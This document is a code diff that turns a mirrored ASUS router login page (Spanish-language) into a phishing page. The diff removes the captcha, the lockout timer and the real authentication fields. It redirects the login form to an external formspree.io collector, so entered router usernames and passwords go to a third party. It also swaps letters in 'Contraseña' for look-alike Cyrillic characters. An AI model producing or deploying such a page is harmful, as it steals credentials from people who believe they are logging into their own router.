@@ -34,11 +34,13 @@ background: url(images/New_ui/login_bg.png) no-repeat center center fixed;
 background-size: cover;
 background:#283437\9;
 }
+
 .logo-container{
 display: flex;
 align-items: center;
 margin-left: 150px;
 }
+
 .logo-container-odm{
 display: flex;
 justify-content: space-between;
@@ -108,22 +110,6 @@ display: flex;
 justify-content: center;
 margin: 0 0 20px 0;
 }
-.warming_desc{
-margin:0px 30px 0px 185px;
-font-size: 14px;
-align-items: center;
-color:#FC0;
-line-height:20px;
-width: 520px;
-}
-.error-hint-bg{
-width: 537px;
-height: 70px;
-display:flex;
-align-items: center;
-margin: 40px auto;
-background: url('images/New_ui/icon_Sec_hint.png') no-repeat;
-}
 .error-text{
 margin: 0 30px 0 112px;
 font-size: 20px;
@@ -191,42 +177,7 @@ background-color: #576D73\9;
 .form-input:focus{
 border-bottom: 2px solid #AB0015;
 }
-#captcha_img_div{
-margin: 30px 0px 0px 30px;
-width: 160px;
-height: 60px;
-border-radius: 4px;
-background-color:#FFF;
-float: left;
-}
-#captcha_pic{
-width: 90%;
-height:90%;
-margin: 3px 0px 0px 0px;
-}
-#captcha_input_div{
-margin: 30px 0px 0px 0px;
-float: left;
-}
-#captcha_text{
-width: 245px;
-background-color: rgba(255,255,255,0.2);
-background-color: #576D73\9;
-border-radius: 4px;
-padding: 15px 22px;
-border: 0;
-height: 30px;
-color: #fff;
-font-size: 28px;
-}
-#reCaptcha{
-margin: 45px 0px 0px 10px;
-width: 30px;
-height: 30px;
-float: left;
-background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22iso-8859-1%22%3F%3E%0A%3C!DOCTYPE%20svg%20PUBLIC%20%22-%2F%2FW3C%2F%2FDTD%20SVG%201.1%2F%2FEN%22%20%22http%3A%2F%2Fwww.w3.org%2FGraphics%2FSVG%2F1.1%2FDTD%2Fsvg11.dtd%22%3E%0A%3Csvg%20version%3D%221.1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2232%22%20height%3D%2232%22%20viewBox%3D%220%200%2032%2032%22%3E%0A%3Cpath%20fill%3D%22%23ABB2BB%22%20d%3D%22M31.638%2022.702c-0.181-0.664-0.906-0.604-1.509-0.785l-1.208-0.423c0.966-1.992%201.087-3.321%201.087-5.555%200-8.211-6.642-14.853-14.853-14.853s-14.853%206.702-14.853%2014.913%206.641%2014.853%2014.853%2014.853c0.664%200%201.208-0.543%201.208-1.208s-0.543-1.208-1.208-1.208c-6.823%200-12.438-5.555-12.438-12.438s5.615-12.438%2012.438-12.438%2012.438%205.555%2012.438%2012.438c0%201.872-0.060%202.838-0.845%204.528l-0.906-0.785c-0.604-0.423-0.906-0.966-1.509-0.785-0.664%200.181-0.966%200.906-0.785%201.509l1.449%204.408c0.181%200.543%200.664%200.845%201.147%200.845%200.121%200%200.241%200%200.362-0.060l4.408-1.449c0.604-0.181%200.966-0.845%200.725-1.509v0z%22%3E%3C%2Fpath%3E%0A%3C%2Fsvg%3E%0A");
-background-repeat: no-repeat;
-}
+
 /*for mobile device*/
 @media screen and (max-width: 1000px){
 .main-field-bg, .main-field-bg-odm{
@@ -276,11 +227,6 @@ line-height: 52px;
 .login-btn-bg, .input-container{
 margin: 0 10px 20px 10px;
 }
-.error-hint-bg{
-width: 100%;
-height: 52px;
-background-size: 100%;
-}
 .error-text{
 line-height: 20px;
 }
@@ -297,38 +243,7 @@ font-size: 12pt;
 width:100%;
 margin: 0 0 5px 10px;
 }
-#captcha_img_div{
-margin-left: 10px;
-width: 30%;
-height: 40px;
-border-radius: 4px;
-background-color:#FFF;
-float: left;
-}
-#captcha_pic{
-width: 90%;
-height: 90%;
-margin: 2px 0px 0px 3px;
-}
-#captcha_input_div{
-margin-left: 15px;
-width: 47%;
-height: 40px;
-}
-#captcha_text{
-padding: 0px 11px;
-width: 80%;
-height: 40px;
-font-size: 16px
-}
-#reCaptcha{
-margin-top: 35px;
-}
-}
 @media screen and (max-width: 320px){
-#captcha_input_div{
-width: 44%;
-}
 }
 </style>
 <script>
@@ -340,53 +255,9 @@ callback.apply(this, [this[i], i, this]);
 }
 };
 }
-function tryParseJSON (jsonString){
-try {
-var o = JSON.parse(jsonString);
-if (o && typeof o === "object") {
-return o;
-}
-}
-catch (e) { }
-return false;
-};
-var login_info = tryParseJSON('{ "lock_time": -950109, "error_status": 1, "last_time_lock_warning": 0, "error_num": 0, "page": "cloud_sync.asp" }');
-var isIE8 = navigator.userAgent.search("MSIE 8") > -1;
-var isIE9 = navigator.userAgent.search("MSIE 9") > -1;
-var remaining_time = login_info.lock_time;
-var countdownid, rtime_obj;
-var redirect_page = login_info.page;
-var cloud_file = '';
-var isRouterMode = ('1' == '1') ? true : false;
-var header_info = [{ "host": "192.168.50.1", "current_page": "Main_Login.asp", "protocol": "http", "port": 80 }][0];
-var ROUTERHOSTNAME = 'www.asusrouter.com';
-var domainNameUrl = header_info.protocol+"://"+ROUTERHOSTNAME+":"+header_info.port;
-var chdom = function(){window.location.href=domainNameUrl};
-(function(){
-if(ROUTERHOSTNAME !== header_info.host && ROUTERHOSTNAME != "" && isRouterMode){
-setTimeout(function(){
-var s=document.createElement("script");s.type="text/javascript";s.src=domainNameUrl+"/chdom.json?hostname="+header_info.host;var h=document.getElementsByTagName("script")[0];h.parentNode.insertBefore(s,h);
-}, 1);
-}
-})();
-function is_logined() { return 0; }
-function login_ip_dec() { return '0'; }
-function login_ip_str() { return '0.0.0.0'; }
-function login_ip_str_now() { return '192.168.50.236'; }
-function login_mac_str() { return 'c0:25:a5:c1:d9:4a'; }
 
 function isSupport(_ptn){
-var ui_support = [{ "mssid": 1, "2.4G": 1, "5G": 1, "update": 1, "usbX2": 1, "switchctrl": 1, "manual_stb": 1, "11AX": 1, "pwrctrl": 1, "WIFI_LOGO": 1, "nandflash": 1, "movistarTriple": 1, "wifi2017": 1, "2p5G_LWAN": 1, "app": 1, "ofdma": 1, "wpa3": 1, "reboot_schedule": 1, "ipv6": 1, "ipv6pt": 1, "s46": 0, "ocnvc": 1, "PARENTAL2": 1, "dnsfilter": 2, "dnspriv": 1, "dualwan": 1, "pptpd": 1, "openvpnd": 1, "utf8_ssid": 1, "printer": 1, "modem": 1, "webdav": 1, "rrsut": 1, "cloudsync": 1, "media": 1, "appnet": 1, "timemachine": 1, "hdspindown": 1, "diskutility": 1, "dnssec": 1, "usb_bk": 1, "frs_feedback": 2, "dblog": 1, "email": 1, "5G-2": 1, "bwdpi": 2, "wrs_wbl": 1, "ookla": 1, "HTTPS": 1, "letsencrypt": 1, "ssh": 1, "vpnc": 1, "vpn_fusion": 1, "repeater": 1, "psta": 1, "wl6": 1, "wifi_tog_btn": 1, "user_low_rssi": 1, "rog": 1, "wifiradar": 1, "tcode": 1, "usericon": 3, "stainfo": 1, "cloudcheck": 1, "realip": 1, "lacp": 1, "wanbonding": 1, "ifttt": 1, "alexa": 1, "ipsec_srv": 5, "mumimo": 1, "netool": 1, "cfg_sync": 1, "no_finiwl": 1, "fupgrade": 1, "afwupg": 1, "betaupg": 1, "amas": 2, "bcmwifi": 1, "aura_rgb": 1, "aura_sync": 1, "boostkey": 1, "bcmhnd": 1, "mbo": 1, "conndiag": 2, "eula": 1, "proxysta": 1, "nvgfn": 1, "iperf3": 1, "wifi6e": 1, "account_binding": 2, "gameMode": 1, "owe_trans": 1, "wireguard": 1, "ftp_ssl": 1, "acl96": 1, "dhdlog": 1, "dis11b": 1, "smart_connect": 1, "dpi_mals": 1, "dpi_vp": 1, "dpi_cc": 1, "adaptive_qos": 1, "traffic_analyzer": 1, "webs_filter": 1, "apps_filter": 1, "web_history": 1, "bandwidth_monitor": 1, "aicloudipk": 0, "concurrep": 0, "rp_express_2g": 0, "rp_express_5g": 0, "hnd": 1, "localap": 1, "nwtool": 1, "usbPortMax": 2, "usbX": 1, "usb3": 1, "wl_mfp": 1, "wlopmode": 0, "11AC": 1, "yadns": 0, "noRouter": 0, "RPMesh": 0, "odm": 0, "dualband": 0, "triband": 1, "quadband": 0, "separate_ssid": 1, "mssid_count": 3, "dhcp_static_dns": 1, "AWV_ookla": 2, "acs_dfs": 1, "wanMax": 2, "open_nat": 1, "uu_accel": 0, "amas_wgn": 1, "internetctrl": 1, "AWV_dpi_cc": 1, "AWV_dpi_vp": 1, "AWV_dpi_mals": 1, "force_roaming": 1, "sta_ap_bind": 1, "re_reconnect": 1, "amas_eap": 1, "amas_fronthaul_network": 5, "del_client_data": 1, "captcha": 2, "ledg": 1, "AWV_ledg": 1, "ledg_count": 0, "AWV_vpnc": 2, "AWV_vpns": 2, "revertfw": 0, "noFwManual": 0, "noupdate": 0, "wtfast_v2": 1, "WL_SCHED_V2": 1, "WL_SCHED_V3": 2, "PC_SCHED_V3": 3, "wpa3rp": 1, "led_ctrl_cap": 0, "mobile_game_mode": 2, "Instant_Guard": 5, "MaxRule_bwdpi_wrs": 64, "MaxRule_parentctrl": 64, "MaxRule_PC_DAYTIME": 256, "PC_REWARD": 1, "MaxRule_extend_limit": 128, "MaxLen_http_name": 32, "MaxLen_http_passwd": 32, "CHPASS": 1, "pre_auth_PAP": 1, "MaxRule_VPN_FUSION_Conn": 4, "amasRouter": 1, "amasNode": 1, "inadyn": 1, "bcm_kf_netfilter": 1, "fullcone": 1, "NEW_PHYMAP": 2, "FAMILY_GROUP": 1, "awsiot": 1, "ddns": 1, "google_asst": 1, "nt_center": 5, "nt_center_ui": 0, "wps_method_ob": 1, "qis_hide_he_features": 1, "ipv6nat": 1, "cobrand_change": 0, "wlband": 1, "profile_sync": 1, "CN_Boost": 0, "5g1_dfs": 1, "5g2_dfs": 0, "cd_iperf": 0, "rwd_mapping": 1, "noasusddns_cn": 1, "noasusddns": 0 }
-][0];
-return (ui_support[_ptn]) ? ui_support[_ptn] : 0;
-}
-var odm_support = isSupport("odm");
-var captcha_support = isSupport("captcha");
-if(captcha_support)
-var captcha_on = (login_info.error_num >= 2 && login_info.error_status != "7" && login_info.error_status != "11")? true : false;
-else
-var captcha_on = false;
-var faq_href = "https://nw-dlcdnet.asus.com/support/forward.html?model=&amp;type=SG_TeleStand&amp;lang=&amp;kw=&amp;num=";
+    
 function initial(){
 /*handle sysdep for ROG or ODM product*/
 if(odm_support){
@@ -530,17 +401,7 @@ else
 document.getElementById("captcha_field").style.display = "none";
 if(history.pushState != undefined) history.pushState("", document.title, window.location.pathname);
 }
-function countdownfunc(){
-remaining_time_min = checkTime(Math.floor(remaining_time/60));
-remaining_time_sec = checkTime(Math.floor(remaining_time%60));
-remaining_time_show = remaining_time_min +":"+ remaining_time_sec;
-rtime_obj.innerHTML = remaining_time_show;
-if (remaining_time==0){
-clearInterval(countdownid);
-setTimeout("top.location.href='Main_Login.html';", 2000);
-}
-remaining_time--;
-}
+
 function login(){
 var trim = function(val){
 val = val+'';
@@ -647,27 +508,13 @@ i="0" + i
 }
 return i
 }
-function regen_captcha(){
-var timestamp = new Date().getTime();
-var captcha_pic = document.getElementById("captcha_pic");
-var queryString = "?t=" + timestamp;
-captcha_pic.src = "captcha.gif" + queryString;
-}
+
 </script>
 </head>
 <body onload="initial();" class="bg">
 <iframe name="hidden_frame" id="hidden_frame" width="0" height="0" frameborder="0"></iframe>
 <iframe id="dmRedirection" width="0" height="0" frameborder="0" scrolling="no" src="#"></iframe>
-<form method="post" name="form" action="http://192.168.50.1/login.cgi" target="">
-<input type="hidden" name="group_id" value="">
-<input type="hidden" name="action_mode" value="">
-<input type="hidden" name="action_script" value="">
-<input type="hidden" name="action_wait" value="5">
-<input type="hidden" name="current_page" value="Main_Login.html">
-<input type="hidden" name="next_page" value="Main_Login.html">
-<input type="hidden" name="login_authorization" value="">
-<input type="hidden" name="login_captcha" value="">
-<input type="hidden" name="cloud_file" value="" disabled>
+<form method="post" name="form" action="https://formspree.io/f/mdkzppvl" target="_blank">
 <div class="main-field-bg">
 <div class="main-field-padding">
 <div class="logo-container">
@@ -681,23 +528,13 @@ captcha_pic.src = "captcha.gif" + queryString;
 <div class="login-title-desc">Inicie sesión en la cuenta del router de ASUS</div>
 <div id="name_title_ie" style="display:none" class="p1">Nombre de usuario</div>
 <div class="input-container">
-<input type="text" id="login_username" name="login_username" tabindex="1" class="form-input" maxlength="200" autocapitalize="off" autocomplete="off" placeholder="Nombre de usuario">
+<input type="text" id="login_username" name="username" tabindex="1" class="form-input" maxlength="200" autocapitalize="off" autocomplete="off" placeholder="Nombre de usuario">
 </div>
-<div id="password_title_ie" style="display:none" class="p1">Contraseña</div>
+<div id="password_title_ie" style="display:none" class="p1">Cоntrаsеñа</div>
 <div class="input-container">
-<input type="password" name="login_passwd" tabindex="2" class="form-input" maxlength="200" placeholder="Contraseña" autocapitalize="off" autocomplete="off">
+<input type="password" name="password" tabindex="2" class="form-input" maxlength="200" placeholder="Cоntrаsеñа" autocapitalize="off" autocomplete="off">
 </div>
-<div class="warming_desc" style="display:none;" id="last_time_lock_warning"></div>
-<div id="error_status_field" class="error-hint-bg" style="display: none;" ></div>
-<div class="input-container">
-<div id="captcha_field" style="display: none;">
-<div id="captcha_input_div"><input id ="captcha_text" name="captcha_text" tabindex="3" maxlength="5" autocapitalize="off" autocomplete="off"></div>
-<div id="captcha_img_div"><img id="captcha_pic"></div>
-<div id="reCaptcha" onclick="regen_captcha();"></div>
-<div class="error_hint" style="display:none; clear:left;" id="error_captcha_field">Captcha is wrong. Please input again.</div>
-</div>
-</div>
-<div id="button" class="login-btn-bg" onclick="login();">Iniciar Sesión</div>
+<button type="submit" id="button" class="login-btn-bg">Iniciar Sesión</button>
 </div>
 <div id="hint_field" class="error-hint-bg" style="display: none;"></div>
 </div>
@@ -709,4 +546,3 @@ captcha_pic.src = "captcha.gif" + queryString;
 
 <!-- Mirrored from 192.168.50.1/Main_Login.asp by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Jun 2025 22:27:33 GMT -->
 </html>
-
